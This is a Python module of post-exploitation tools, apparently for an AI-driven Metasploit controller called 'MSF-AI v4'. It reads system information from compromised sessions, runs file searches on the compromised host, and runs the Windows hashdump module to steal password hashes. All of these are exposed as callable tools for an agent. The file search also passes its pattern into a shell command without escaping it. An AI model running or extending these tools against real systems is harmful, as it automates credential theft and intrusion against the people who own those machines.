"""
Post-Exploitation Utilities for MSF-AI v4
NOTE: Most tools here require the MSF client object, injected by the controller.
"""
import time
from typing import Dict, Any

def wait_for_session_output(session, timeout: int = 5) -> str:
    """Helper to wait for and collect session output."""
    output = ""
    start_time = time.time()
    while time.time() - start_time < timeout:
        res = session.read_output()
        if res:
            output += res
            # If we got something, wait a bit more for the rest
            time.sleep(0.5)
        else:
            if output: break # Exit if we had output and it stopped
            time.sleep(0.5)
    return output

def gather_system_info(client, session_id: int) -> Dict[str, Any]:
    """Gathers system info from a session."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return {"error": "Session not found"}

        info = {
            "type": session.get("type"),
            "platform": session.get("platform"),
            "info": session.get("info")
        }
        return info
    except Exception as e:
        return {"error": str(e)}

def search_files(client, session_id: int, pattern: str) -> str:
    """Searches for files on the compromised host."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return "Session not found"

        if session.get("type") != "meterpreter":
            # Try shell command
            session.write(f"find / -name '{pattern}'\n")
            return wait_for_session_output(session)

        session.write(f"search -f {pattern}\n")
        return wait_for_session_output(session)
    except Exception as e:
        return f"Error: {e}"

def extract_credentials(client, session_id: int) -> str:
    """Runs hashdump or kiwi."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return "Session not found"
        if session.get("type") != "meterpreter":
            return "Requires meterpreter"

        session.run_module("post/windows/gather/hashdump")
        return "Hashdump module executed on session."
    except Exception as e:
        return f"Error: {e}"

def get_tools() -> Dict[str, Any]:
    return {
        "gather_system_info": gather_system_info,
        "search_files": search_files,
        "extract_credentials": extract_credentials
    }
